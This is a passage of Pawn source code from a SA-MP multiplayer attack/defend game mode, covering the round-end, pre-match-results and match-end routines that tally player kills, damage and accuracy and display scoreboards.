	            else format(str, sizeof(str), "{FFFFFF}%d{3377FF}\t%s\t\t\t%s\t\t%s%d\n", i+1, WeaponNames[GunMenuWeapons[i][0]], WeaponNames[GunMenuWeapons[i][1]], tabs, WeaponLimit[i] - TimesPicked[DEFENDER][i]);
	            strcat(WepTStr, str);
	        }
			ShowPlayerDialog(playerid, DIALOG_WEAPONS_TYPE, DIALOG_STYLE_LIST, "{FFFFFF}Select your weapon set:",WepTStr, "Select", "");
		} case REFEREE: {
			TogglePlayerControllableEx(playerid, true);
		}
	}

//	if(!IsPlayerInAnyVehicle(playerid)) SetPlayerVirtualWorld(playerid, playerid+100);
}

new bool:AlreadyEndingRound = false;

forward NotEndingRound();
public NotEndingRound()
{
    AlreadyEndingRound = false;
    return 1;
}

EndRound(WinID) //WinID: 0 = CP, 1 = RoundTime, 2 = NoAttackersLeft, 3 = NoDefendersLeft
{
	if(AlreadyEndingRound == true)
	    return 0;
	    
    AlreadyEndingRound = true;

	switch(GameType) {
	    case BASE: {
			BaseStarted = false;
			BasesPlayed++;
	    } case ARENA,TDM: {
			ArenaStarted = false;
			ArenasPlayed++;
	    }
	}


	if( WarMode == true )
	{
		if( MatchRoundsRecord[ MatchRoundsStarted - 1 ][ round__ID ] == Current )
		{
		    MatchRoundsRecord[ MatchRoundsStarted - 1 ][ round__completed ] = true;
		}
	}
	#if MATCH_SYNC == 1
	MATCHSYNC_UpdateAllPlayers(WHEN_ROUND_END);
	#endif

    ElapsedTime = 0;
    PlayersInCP = 0;
    MatchEnded = false;
	FallProtection = false;

    if(RoundPaused == true)
		TextDrawHideForAll(PauseTD);
    RoundPaused = false;
    RoundUnpausing = false;

	PlayersAlive[ATTACKER] = 0;
	PlayersAlive[DEFENDER] = 0;

    GangZoneDestroy(CPZone);
	GangZoneDestroy(ArenaZone);

	new iString[256], TopString[3][128];

	foreach(new i:Player)
	{
		if(Player[i][Style] == 0) TextDrawHideForPlayer(i, RoundStats);
		else HideRoundStats(i);
	}
	TextDrawHideForAll(EN_CheckPoint);

	if(WinID == 0 || WinID == 3) {
		format(iString, sizeof(iString), "~n~~r~~h~%s ~w~Won The Round", TeamName[ATTACKER]);
		if(WarMode == true) TeamScore[ATTACKER]++;
	} else if(WinID == 1 || WinID == 2) {
		format(iString, sizeof(iString), "~n~~b~~h~%s ~w~Won The Round", TeamName[DEFENDER]);
		if(WarMode == true) TeamScore[DEFENDER]++;
 	} else if(WinID == 4) {
 	    #if ENABLED_TDM == 1
 	    if( GameType == TDM ) iString = "~n~~w~Tie, ~g~~h~~h~Same Kills";
 	    else iString = "~n~~w~No One Won, Same Team HPs";
		#else
		iString = "~n~~w~No One Won, Same Team HPs";
 	    #endif
	}
	TextDrawSetString(topTextScore, iString);

	format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
    TextDrawSetString(TeamScoreText, iString);

	if(WarMode == true) {
		CurrentRound++;
		format(iString, sizeof(iString), "%sRounds ~r~~h~%d~r~/~h~~h~%d", MAIN_TEXT_COLOUR, CurrentRound, TotalRounds);
		TextDrawSetString(RoundsPlayed, iString);
	}

	// ROUND_REMOVED
/*	iString = "~l~Name\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tKill\t\t\t\t\tHP\t\t\t\t\tAcc\t\t\t\t\tDmg";
	TextDrawSetString(EN_AttackerTitle, iString);

	iString = "~l~Name\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tKill\t\t\t\t\tHP\t\t\t\t\tAcc\t\t\t\t\tDmg";
	TextDrawSetString(EN_DefenderTitle, iString);
*/
	// replaced by leftText, rightText
	iString = "~l~Name\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tKill\t\t\t\tHP\t\t\t\tAcc\t\t\tDmg";
	TextDrawSetString(leftText, iString);
	TextDrawSetString(rightText, iString);

	SendRconCommand("mapname Lobby");
	SetGameModeText(GM_NAME);


	new
	    playerScores[MAX_PLAYERS][rankingEnum],
	    index,
	    p,
	    names[MAX_PLAYERS][MAX_PLAYER_NAME]
	;

	new Float: ahpleft,
		Float: dhpleft,
	    aalive, dalive
	;


	foreach(new i : Player) if(Player[i][Spawned] == true) {
		if(Player[i][WasInBase] == true) {
		    if(Player[i][Playing] == true) {
				OnPlayerAmmoUpdate(i);
				new Float:HP[2];
				GetHP(i, HP[0]);
				GetAP(i, HP[1]);

				if(Player[i][Team] == ATTACKER) {
					ahpleft = ahpleft + (HP[0] + HP[1]);
					aalive++;
				} else if(Player[i][Team] == DEFENDER) {
					dhpleft = dhpleft + (HP[0] + HP[1]);
					dalive++;
				}

    			PlayerNoLeadTeam(i);
			}

			playerScores[index][player_Score] = floatround(Player[i][RoundDamage], floatround_round);
			if(Player[i][Playing] == true) playerScores[index][player_Team] = Player[i][Team];
			else playerScores[index][player_Team] = Player[i][TempTeam];
			playerScores[index][player_Kills] = Player[i][RoundKills];
			playerScores[index][player_Deaths] = Player[i][RoundDeaths];
			playerScores[index][player_HP] = floatround(Player[i][pHealth] + Player[i][pArmour], floatround_round);
			playerScores[index][player_Acc] = floatround(Player[i][Accuracy], floatround_round);

			//playerScores[index][player_TPlayed] = Player[i][RoundPlayed];
			//format(playerScores[index][player_Name], MAX_PLAYER_NAME, Player[i][NameWithoutTag]);

			format(names[index], MAX_PLAYER_NAME, Player[i][NameWithoutTag]);

			playerScores[index++][player_ID] = i;
		    p++;

		    Player[i][RoundPlayed]++;
		}

		VehiclePos[i][0] = 0.0;
		VehiclePos[i][1] = 0.0;
		VehiclePos[i][2] = 0.0;

		new bool:TempPlaying = false;
		if(Player[i][Playing] == true) TempPlaying = true;

		Player[i][Playing] = false;
		Player[i][WasInCP] = false;
		Player[i][ToAddInRound] = false;
		if(Player[i][Spectating] == true) StopSpectate(i);
		Player[i][WasInBase] = false;
		Player[i][WeaponPicked] = 0;
		Player[i][TimesSpawned] = 0;
		Player[i][VoteToAddID] = -1;
		Player[i][VoteToNetCheck] = -1;
		Player[i][Votekick] = -1;
		RemovePlayerMapIcon(i, 59);

		TextDrawHideForPlayer(i, AttackerTeam[0]);
		TextDrawHideForPlayer(i, AttackerTeam[1]);
		TextDrawHideForPlayer(i, DefenderTeam[0]);
		TextDrawHideForPlayer(i, DefenderTeam[1]);
		TextDrawHideForPlayer(i, AttackerTeam[2]);
		TextDrawHideForPlayer(i, AttackerTeam[3]);
		TextDrawHideForPlayer(i, DefenderTeam[2]);
		TextDrawHideForPlayer(i, DefenderTeam[3]);

	    PlayerTextDrawHide(i, AreaCheckTD);
	    PlayerTextDrawHide(i, AreaCheckBG);

		if(Player[i][InDuel] == false) {
			SetHP(i, 100);
			SetAP(i, 100);
		}


//		ColorFix(i);

        if(TempPlaying == true) {
//			SetPlayerVirtualWorld(i, i);
//			SetSpawnInfoEx(i, GetPlayerTeam(i), Skin[Player[i][Team]], MainSpawn[0]+random(5),MainSpawn[1]+random(5),MainSpawn[2]+1, MainSpawn[3], 0, 0, 0, 0, 0, 0);
//			SetPlayerInterior(i,MainInterior);
//			Player[i][IgnoreSpawn] = true;
			SpawnPlayerEx(i);

		    PlayerTextDrawHide(i, DeathText[0]);
			PlayerTextDrawHide(i, DeathText[1]);


		}

		if(Player[i][InDuel] == false) ShowEndRoundTextDraw(i);
		DisablePlayerCheckpoint(i);
		SetPlayerScore(i, 0);
		HideDialogs(i);

	}
	
	for(new i=0; i < SAVE_SLOTS; ++i) {
		if(strlen(SaveVariables[i][pName]) > 2 && Current == SaveVariables[i][RoundID] && SaveVariables[i][CheckScore] == true) {
	    	playerScores[index][player_Score] = floatround(SaveVariables[i][RDamage], floatround_round);
	    	playerScores[index][player_Team] = SaveVariables[i][pTeam];
	    	playerScores[index][player_Kills] = SaveVariables[i][RKills];
	    	playerScores[index][player_Deaths] = SaveVariables[i][RDeaths];
			playerScores[index][player_HP] = floatround(SaveVariables[i][gHealth] + SaveVariables[i][gArmour], floatround_round);
			playerScores[index][player_Acc] = SaveVariables[i][iAccuracy];
//			playerScores[index][player_TPlayed] = SaveVariables[i][TPlayed];

			format(names[index], MAX_PLAYER_NAME, SaveVariables[i][pNameWithoutTag]);

	   	    SaveVariables[i][RKills]   	=  	0;
			SaveVariables[i][RDeaths]  	= 	0;
			SaveVariables[i][RDamage] 	= 	0;

			SaveVariables[i][RoundID]   =   -1;
//			SaveVariables[i][TPlayed]++;
            SaveVariables[i][CheckScore] = false;

			index++;
			p++;
		}
	}

	Current = -1;

	GetPlayerHighestScores2(playerScores, names, 0, index-1);


	new topkill, topkillID = -1,
		Float: topDmg, topDmgID = -1,
		topAcc, topAccID = -1
	;

	for(new i = 0; i != p; ++i) {

	    if( playerScores[i][player_Kills] > topkill && playerScores[i][player_Kills] > 0 )
	    {
            topkill = playerScores[i][player_Kills];
            topkillID = i;
	    }
	    if( playerScores[i][player_Score] > topDmg && playerScores[i][player_Score] > 0  )
	    {
            topDmg = playerScores[i][player_Score];
            topDmgID = i;
	    }
	    if( playerScores[i][player_Acc] > topAcc && playerScores[i][player_Acc] > 0  )
	    {
            topAcc = playerScores[i][player_Acc];
            topAccID = i;
	    }

	    if(playerScores[i][player_Team] == ATTACKER || playerScores[i][player_Team] == ATTACKER_SUB) {
	        format(AttList, sizeof(AttList), "%s~w~%s~n~", AttList, names[i]);
		    format(AttKills, sizeof(AttKills), "%s~w~%d~n~", AttKills, playerScores[i][player_Kills]);
		    if(playerScores[i][player_Deaths] > 0) {
				format(AttDeaths, sizeof(AttDeaths), "%s~w~Dead~n~", AttDeaths);
			} else {
				format(AttDeaths, sizeof(AttDeaths), "%s~w~%d~n~", AttDeaths, playerScores[i][player_HP]);
//				ahpleft += playerScores[i][player_HP];
//				aalive++;
			}
	        format(AttDamage, sizeof(AttDamage), "%s~w~%d~n~", AttDamage, playerScores[i][player_Score]);
            format(AttAcc, sizeof(AttAcc), "%s~w~%d%%~n~", AttAcc, playerScores[i][player_Acc]);

		} else if(playerScores[i][player_Team] == DEFENDER || playerScores[i][player_Team] == DEFENDER_SUB) {
	        format(DefList, sizeof(DefList), "%s~w~%s~n~", DefList, names[i]);
	        format(DefKills, sizeof(DefKills), "%s~w~%d~n~", DefKills, playerScores[i][player_Kills]);
	        if(playerScores[i][player_Deaths] > 0) {
				format(DefDeaths, sizeof(DefDeaths), "%s~w~Dead~n~", DefDeaths);
			} else {
				format(DefDeaths, sizeof(DefDeaths), "%s~w~%d~n~", DefDeaths, playerScores[i][player_HP]);
//				dhpleft += playerScores[i][player_HP];
//				dalive++;
			}

	        format(DefDamage, sizeof(DefDamage), "%s~w~%d~n~", DefDamage, playerScores[i][player_Score]);
	        format(DefAcc, sizeof(DefAcc), "%s~w~%d%%~n~", DefAcc, playerScores[i][player_Acc]);

		}

		if(i == 0) format(TopString[0], 128, "%s1st         -         %s   	({FFFFFF}%d%s)", TextColor[playerScores[i][player_Team]], names[i], playerScores[i][player_Score], TextColor[playerScores[i][player_Team]]);
		else if(i == 1) format(TopString[1], 128, "%s2nd         -         %s   	({FFFFFF}%d%s)", TextColor[playerScores[i][player_Team]], names[i], playerScores[i][player_Score], TextColor[playerScores[i][player_Team]]);
		else if(i == 2) format(TopString[2], 128, "%s3rd         -         %s   	({FFFFFF}%d%s)", TextColor[playerScores[i][player_Team]], names[i], playerScores[i][player_Score], TextColor[playerScores[i][player_Team]]);

	}

	iString = "";

	if( topkillID >= 0 ) format( iString, sizeof(iString) , "~w~~h~Most Kills: %s~h~~h~%s ~w~~h~%d_____", TDC[playerScores[topkillID][player_Team]], names[topkillID] , topkill  );
	else format( iString, sizeof(iString) , "~w~~h~Most Kills: None_____" );
	if( topDmgID >= 0 ) format( iString, sizeof(iString) , "%s~w~~h~Most Dmg: %s~h~~h~%s ~w~~h~%.0f_____", iString, TDC[playerScores[topDmgID][player_Team]], names[topDmgID] , topDmg  );
	else format( iString, sizeof(iString) , "%s~w~~h~Most Dmg: None_____", iString );
    if( topAccID >= 0 ) format( iString, sizeof(iString) , "%s~w~~h~Top Acc: %s~h~~h~%s ~w~~h~%d%%", iString, TDC[playerScores[topAccID][player_Team]], names[topAccID] , topAcc  );
	else format( iString, sizeof(iString) , "%s~w~~h~Top Acc: None", iString );
	TextDrawSetString( leftTop, iString );

/*	if( topAccID >= 0 ) format( iString, sizeof(iString) , "Top Acc: %s (%d)", names[topAccID] , topAcc  );
	else format( iString, sizeof(iString) , "Top Acc: None" );
	TextDrawSetString( rightTop, iString );
*/
    iString = "";

    switch( WinID )
	{
	    case 0: format( iString, sizeof(iString), "~r~~h~~h~Attackers ~w~has held the ~b~~h~~h~Checkpoint");
	    case 3: format( iString, sizeof(iString), "~r~~h~~h~~h~Attackers ~w~won by ~r~~h~%.0f hp ~w~and ~r~~h~~h~%d players alive" , ahpleft, aalive);
	    case 1, 2: format( iString, sizeof(iString), "~b~~h~~h~~h~Defenders ~w~won by ~b~~h~%.0f hp ~w~and ~b~~h~~h~%d players alive" ,dhpleft, dalive);
	}

    #if ENABLED_TDM == 1
	if( GameType == TDM )
	{
	    switch( WinID )
		{
		    case 0: format( iString, sizeof(iString), "~w~Ok No idea why we here");
		    case 3: format( iString, sizeof(iString), "~r~~h~~h~~h~Attackers ~w~won with ~r~~h~~h~%d kills" , TeamTDMKills[ATTACKER]);
		    case 1, 2: format( iString, sizeof(iString), "~b~~h~~h~~h~Defenders ~w~won with ~b~~h~~h~%d kills" ,TeamTDMKills[DEFENDER]);
		}
		TeamTDMKills[ATTACKER] = 0;
		TeamTDMKills[DEFENDER] = 0;
	}

	#endif
	TextDrawSetString( teamWonHow, iString);

/* // ROUND_REMOVED
	TextDrawSetString(EN_AttackerList, AttList);
	TextDrawSetString(EN_AttackerKills, AttKills);
	TextDrawSetString(EN_AttackerHP, AttDeaths);
	TextDrawSetString(EN_AttackerAccuracy, AttAcc);
	TextDrawSetString(EN_AttackerDamage, AttDamage);
	TextDrawSetString(EN_DefenderList, DefList);
	TextDrawSetString(EN_DefenderKills, DefKills);
	TextDrawSetString(EN_DefenderHP, DefDeaths);
	TextDrawSetString(EN_DefenderAccuracy, DefAcc);
	TextDrawSetString(EN_DefenderDamage, DefDamage);
*/
//
	TextDrawSetString(leftNames, AttList);
	TextDrawSetString(leftKills, AttKills);
	TextDrawSetString(leftHP, AttDeaths);
	TextDrawSetString(leftAcc, AttAcc);
	TextDrawSetString(leftDmg, AttDamage);

	TextDrawSetString(rightNames, DefList);
	TextDrawSetString(rightKills, DefKills);
	TextDrawSetString(rightHP, DefDeaths);
	TextDrawSetString(rightAcc, DefAcc);
	TextDrawSetString(rightDmg, DefDamage);
//

	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
    SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, "{FFFFFF}---------------------------------------------------------------");
//	SendClientMessageToAll(-1, "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{FFFFFF}Top Players");
    SendClientMessageToAll(-1, "{FFFFFF}Top Stooopids:");
	SendClientMessageToAll(-1, TopString[0]);
	SendClientMessageToAll(-1, TopString[1]);
	SendClientMessageToAll(-1, TopString[2]);
//	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, "{FFFFFF}---------------------------------------------------------------");

	AllowStartBase = false;

	if(WarMode == true) {
    	SetTimer("SwapBothTeams",2500,0);
	}

	if(WarMode == false) {
		if(AutoBal == true) {
			SetTimer("DoAutoBalance",2500,0);
		} else {
			SetTimer("DontAutoBalance",2500,0);
		}
	}


	if(CurrentRound >= TotalRounds && CurrentRound != 0) {
		SetTimer("WarEnded", 5000, 0);
		SendClientMessageToAll(-1, ""COL_PRIM"Preparing End Match Results..");
		SendClientMessageToAll(-1, ""COL_PRIM"If you missed the results screen by hiding the current textdraws, type {FFFFFF}/showagain");
        SendClientMessageToAll(-1, ""COL_PRIM"Type {FFFFFF}/weaponstats "COL_PRIM"to see a list of players weapon statistics.");
	}



	TextDrawSetString(AttackerTeam[0], "_");
	TextDrawSetString(AttackerTeam[1], "_");
	TextDrawSetString(DefenderTeam[0], "_");
	TextDrawSetString(DefenderTeam[1], "_");
	TextDrawSetString(AttackerTeam[2], "_");
	TextDrawSetString(AttackerTeam[3], "_");
	TextDrawSetString(DefenderTeam[2], "_");
	TextDrawSetString(DefenderTeam[3], "_");

	AttList = "";
	AttKills = "";
	AttDeaths = "";
	AttDamage = "";
	AttAcc = "";
	DefList = "";
	DefKills = "";
	DefDeaths = "";
	DefDamage = "";
	DefAcc = "";

    ResetTeamLeaders();
    
    SetTimer("NotEndingRound", 3000, false);
	return 1;
}

forward PreMatchResults();
public PreMatchResults()
{
    ClearKillList(); // Clears the kill-list.

    MatchEnded = true;

	new iString[256], TopString[3][128];

    if(TeamScore[ATTACKER] > TeamScore[DEFENDER]) {
 		format(iString, sizeof(iString),"%sPre-Match Results~n~~r~%s %sWon The Match~n~~r~%s ~h~%d		~b~~h~%s ~h~%d", MAIN_TEXT_COLOUR, TeamName[ATTACKER], MAIN_TEXT_COLOUR, TeamName[ATTACKER], TeamScore[ATTACKER], TeamName[DEFENDER], TeamScore[DEFENDER]);
	} else if(TeamScore[DEFENDER] > TeamScore[ATTACKER]) {
	    format(iString,sizeof(iString),"%sPre-Match Results~n~~b~~h~%s %sWon The Match~n~~b~~h~%s ~h~%d		~r~%s ~h~%d", MAIN_TEXT_COLOUR, TeamName[DEFENDER], MAIN_TEXT_COLOUR, TeamName[DEFENDER], TeamScore[DEFENDER], TeamName[ATTACKER], TeamScore[ATTACKER]);
	} else {
	    format(iString,sizeof(iString),"%sPre-Match Results~n~%sNo One Won The Match~n~~r~%s ~h~%d		~b~~h~%s ~h~%d", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, TeamName[ATTACKER], TeamScore[ATTACKER], TeamName[DEFENDER], TeamScore[DEFENDER]);
	}
	//TextDrawSetString(EN_WhoWon, iString);
	TextDrawSetString(topTextScore, iString);

/*  // ROUND_REMOVED
	iString = "~l~Name\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tK\t\t\t\tD\t\t\t\tP\t\t\t\tAcc\t\t\t\t\tDmg";
	TextDrawSetString(EN_AttackerTitle, iString);

	iString = "~l~Name\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tK\t\t\t\tD\t\t\t\tP\t\t\t\tAcc\t\t\t\t\tDmg";
	TextDrawSetString(EN_DefenderTitle, iString);
*/
	iString = "~l~Name\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tKill\t\t\t\tHP\t\t\t\tAcc\t\t\tDmg";
	TextDrawSetString(leftText, iString);
	TextDrawSetString(rightText, iString);

	new
	    playerScores[MAX_PLAYERS][rankingEnum],
	    index,
	    p,
	    names[MAX_PLAYERS][MAX_PLAYER_NAME]

	;


	foreach(new i : Player) {
		if(Player[i][TotalDamage] > 0) {
			playerScores[index][player_Score] = floatround(Player[i][TotalDamage], floatround_round);
			playerScores[index][player_Team] = Player[i][Team];
			playerScores[index][player_Kills] = Player[i][TotalKills];
			playerScores[index][player_Deaths] = Player[i][TotalDeaths];
			playerScores[index][player_TPlayed] = Player[i][RoundPlayed];
			playerScores[index][player_HP] = floatround(Player[i][pHealth] + Player[i][pArmour], floatround_round);

			new Float:nTotalAccuracy;
			if(Player[i][TotalBulletsFired] == 0) nTotalAccuracy = 0.0;
			else nTotalAccuracy = floatmul(100.0, floatdiv(Player[i][TotalshotsHit], Player[i][TotalBulletsFired]));
			playerScores[index][player_Acc] = floatround(nTotalAccuracy, floatround_round);

			format(names[index], MAX_PLAYER_NAME, Player[i][NameWithoutTag]);

		    playerScores[index++][player_ID] = i;
		    p++;
		}
		if(Player[i][Spectating] == true) StopSpectate(i);

		ShowEndRoundTextDraw(i);
		if(Player[i][InDM] == false) SetPlayerVirtualWorld(i, i);

	}
	for(new i=0; i < SAVE_SLOTS; ++i) {
		if(strlen(SaveVariables[i][pName]) > 2 && SaveVariables[i][TDamage] > 0) {
	    	playerScores[index][player_Score] = floatround(SaveVariables[i][TDamage], floatround_round);
	    	playerScores[index][player_Team] = SaveVariables[i][pTeam];
	    	playerScores[index][player_Kills] = SaveVariables[i][TKills];
	    	playerScores[index][player_Deaths] = SaveVariables[i][TDeaths];
	    	playerScores[index][player_TPlayed] = SaveVariables[i][TPlayed];
	    	playerScores[index][player_HP] = floatround(SaveVariables[i][gHealth] + SaveVariables[i][gArmour], floatround_round);

			new Float:nTotalAccuracy;
			if(SaveVariables[i][tBulletsShot] == 0) nTotalAccuracy = 0.0;
			else nTotalAccuracy = floatmul(100.0, floatdiv(SaveVariables[i][tshotsHit], SaveVariables[i][tBulletsShot]));
			playerScores[index][player_Acc] = floatround(nTotalAccuracy, floatround_round);

			format(names[index], MAX_PLAYER_NAME, SaveVariables[i][pNameWithoutTag]);

			index++;
			p++;
		}
	}

	GetPlayerHighestScores2(playerScores, names, 0, index-1);

	new topkill, topkillID = -1,
		Float: topDmg, topDmgID = -1,
		topAcc, topAccID = -1
	;

	for(new i = 0; i != p; ++i) {

		if( playerScores[i][player_Kills] > topkill && playerScores[i][player_Kills] > 0 )
	    {
            topkill = playerScores[i][player_Kills];
            topkillID = i;
	    }
	    if( playerScores[i][player_Score] > topDmg && playerScores[i][player_Score] > 0  )
	    {
            topDmg = playerScores[i][player_Score];
            topDmgID = i;
	    }
	    if( playerScores[i][player_Acc] > topAcc && playerScores[i][player_Acc] > 0  )
	    {
            topAcc = playerScores[i][player_Acc];
            topAccID = i;
	    }

	    if(playerScores[i][player_Team] == ATTACKER) {
	        format(AttList, sizeof(AttList), "%s~w~%s~n~", AttList, names[i]);
		    format(AttKills, sizeof(AttKills), "%s~w~%d~n~", AttKills, playerScores[i][player_Kills]);
	        format(AttDeaths, sizeof(AttDeaths), "%s~w~%d~n~", AttDeaths, playerScores[i][player_Deaths]);
	        format(AttPlayed, sizeof(AttPlayed), "%s~w~%d~n~", AttPlayed, playerScores[i][player_TPlayed]);
	        format(AttDamage, sizeof(AttDamage), "%s~w~%d~n~", AttDamage, playerScores[i][player_Score]);
	        format(AttAcc, sizeof(AttAcc), "%s~w~%d%%~n~", AttAcc, playerScores[i][player_Acc]);
		} else if(playerScores[i][player_Team] == DEFENDER) {
	        format(DefList, sizeof(DefList), "%s~w~%s~n~", DefList, names[i]);
	        format(DefKills, sizeof(DefKills), "%s~w~%d~n~", DefKills, playerScores[i][player_Kills]);
	        format(DefDeaths, sizeof(DefDeaths), "%s~w~%d~n~", DefDeaths, playerScores[i][player_Deaths]);
	        format(DefPlayed, sizeof(DefPlayed), "%s~w~%d~n~", DefPlayed, playerScores[i][player_TPlayed]);
	        format(DefDamage, sizeof(DefDamage), "%s~w~%d~n~", DefDamage, playerScores[i][player_Score]);
	        format(DefAcc, sizeof(DefAcc), "%s~w~%d%%~n~", DefAcc, playerScores[i][player_Acc]);
		}
		
		if(i == 0) format(TopString[0], 128, "%s1st         -         %s   	({FFFFFF}%d%s)", TextColor[playerScores[i][player_Team]], names[i], playerScores[i][player_Score], TextColor[playerScores[i][player_Team]]);
		else if(i == 1) format(TopString[1], 128, "%s2nd         -         %s   	({FFFFFF}%d%s)", TextColor[playerScores[i][player_Team]], names[i], playerScores[i][player_Score], TextColor[playerScores[i][player_Team]]);
		else if(i == 2) format(TopString[2], 128, "%s3rd         -         %s   	({FFFFFF}%d%s)", TextColor[playerScores[i][player_Team]], names[i], playerScores[i][player_Score], TextColor[playerScores[i][player_Team]]);
	}

	iString = "";

	if( topAccID >= 0 ) format( iString, sizeof(iString) , "~w~~h~Most Kills: %s~h~~h~%s ~w~~h~%d_____", TDC[playerScores[topkillID][player_Team]], names[topkillID] , topkill  );
	else format( iString, sizeof(iString) , "~w~~h~Most Kills: None_____" );
	if( topDmgID >= 0 ) format( iString, sizeof(iString) , "%s~w~~h~Most Dmg: %s~h~~h~%s ~w~~h~%.0f_____", iString, TDC[playerScores[topDmgID][player_Team]], names[topDmgID] , topDmg  );
	else format( iString, sizeof(iString) , "%s~w~~h~Most Dmg: None_____", iString );
    if( topAccID >= 0 ) format( iString, sizeof(iString) , "%s~w~~h~Top Acc: %s~h~~h~%s ~w~~h~%d%%", iString, TDC[playerScores[topAccID][player_Team]], names[topAccID] , topAcc  );
	else format( iString, sizeof(iString) , "%s~w~~h~Top Acc: None", iString );
	TextDrawSetString( leftTop, iString );

/* // ROUND_REMOVED
	TextDrawSetString(EN_AttackerList, AttList);
	TextDrawSetString(EN_TAttackerKills, AttKills);
	TextDrawSetString(EN_TAttackerDeaths, AttDeaths);
	TextDrawSetString(EN_TAttackerRoundsPlayed, AttPlayed);
	TextDrawSetString(EN_TAttackerAccuracy, AttAcc);
	TextDrawSetString(EN_TAttackerDamage, AttDamage);


	TextDrawSetString(EN_DefenderList, DefList);
	TextDrawSetString(EN_TDefenderKills, DefKills);
	TextDrawSetString(EN_TDefenderDeaths, DefDeaths);
	TextDrawSetString(EN_TDefenderRoundsPlayed, DefPlayed);
	TextDrawSetString(EN_TDefenderAccuracy, DefAcc);
	TextDrawSetString(EN_TDefenderDamage, DefDamage);
*/
	TextDrawSetString(leftPlayed, AttPlayed );

	TextDrawSetString(leftNames, AttList);
	TextDrawSetString(leftKills, AttKills);
	TextDrawSetString(leftHP, AttDeaths);
	TextDrawSetString(leftAcc, AttAcc);
	TextDrawSetString(leftDmg, AttDamage);

	TextDrawSetString(rightNames, DefList);
	TextDrawSetString(rightKills, DefKills);
	TextDrawSetString(rightHP, DefDeaths);
	TextDrawSetString(rightAcc, DefAcc);
	TextDrawSetString(rightDmg, DefDamage);

	TextDrawSetString(rightPlayed, DefPlayed );
	
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
    SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, "{FFFFFF}---------------------------------------------------------------");
    SendClientMessageToAll(-1, "{FFFFFF}Top Stooopids:");
	SendClientMessageToAll(-1, TopString[0]);
	SendClientMessageToAll(-1, TopString[1]);
	SendClientMessageToAll(-1, TopString[2]);
	SendClientMessageToAll(-1, "{FFFFFF}---------------------------------------------------------------");


	AttList = "";
	AttKills = "";
	AttDeaths = "";
	AttPlayed = "";
	AttAcc = "";
	AttDamage = "";

	DefList = "";
	DefKills = "";
	DefDeaths = "";
	DefPlayed = "";
	DefAcc = "";
	DefDamage = "";

	PreMatchResultsShowing = false;
    AllowStartBase = true;
	return 1;
}

forward WarEnded();
public WarEnded()
{
	#if MATCH_SYNC == 1
	//MATCHSYNC_UpdateAllPlayers(WHEN_MATCH_END);
	MATCHSYNC_InsertMatchStats();
	#endif

    ClearKillList(); // Clears the kill-list.

	new iString[256], TopString[3][128];

    if(TeamScore[ATTACKER] > TeamScore[DEFENDER]) {
 		format(iString, sizeof(iString),"~r~%s ~w~Won The Match~n~~r~%s ~h~%d		~b~~h~%s ~h~%d", TeamName[ATTACKER], TeamName[ATTACKER], TeamScore[ATTACKER], TeamName[DEFENDER], TeamScore[DEFENDER]);
	} else if(TeamScore[DEFENDER] > TeamScore[ATTACKER]) {
	    format(iString,sizeof(iString),"~b~~h~%s ~w~Won The Match~n~~b~~h~%s ~h~%d		~r~%s ~h~%d", TeamName[DEFENDER], TeamName[DEFENDER], TeamScore[DEFENDER], TeamName[ATTACKER], TeamScore[ATTACKER]);
	} else {
	    format(iString,sizeof(iString),"~w~No One Won The Match~n~~r~%s ~h~%d		~b~~h~%s ~h~%d", TeamName[ATTACKER], TeamScore[ATTACKER], TeamName[DEFENDER], TeamScore[DEFENDER]);
	}
//	TextDrawSetString(EN_WhoWon, iString);
    TextDrawSetString(topTextScore, iString);

	MatchEnded = true;

	SetWeaponStatsString();

	CurrentRound = 0;
	format(iString, sizeof(iString), "SELECT * FROM Configs WHERE Option = 'Total Rounds'");
    new DBResult:res = db_query(sqliteconnection, iString);

	db_get_field_assoc(res, "Value", iString, sizeof(iString));
	TotalRounds = strval(iString);
	db_free_result(res);

	format(iString, sizeof(iString), "%sRounds ~r~~h~%d~r~/~h~~h~%d", MAIN_TEXT_COLOUR, CurrentRound, TotalRounds);
	TextDrawSetString(RoundsPlayed, iString);

    WarMode = false;

    TextDrawHideForAll(RoundsPlayed);
    TextDrawHideForAll(TeamScoreText);

	iString = sprintf("%sWar Mode: ~r~OFF", MAIN_TEXT_COLOUR);
	TextDrawSetString(WarModeText, iString);

/*  // ROUND_REMOVED
	iString = "~l~Name\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tK\t\t\t\tD\t\t\t\tP\t\t\t\tAcc\t\t\t\t\tDmg";
	TextDrawSetString(EN_AttackerTitle, iString);

	iString = "~l~Name\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tK\t\t\t\tD\t\t\t\tP\t\t\t\tAcc\t\t\t\t\tDmg";
	TextDrawSetString(EN_DefenderTitle, iString);
*/

	iString = "~l~Name\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tK\t\t\tD\t\t\tP\t\t\tAcc\t\t\tDmg";	TextDrawSetString(leftText, iString);
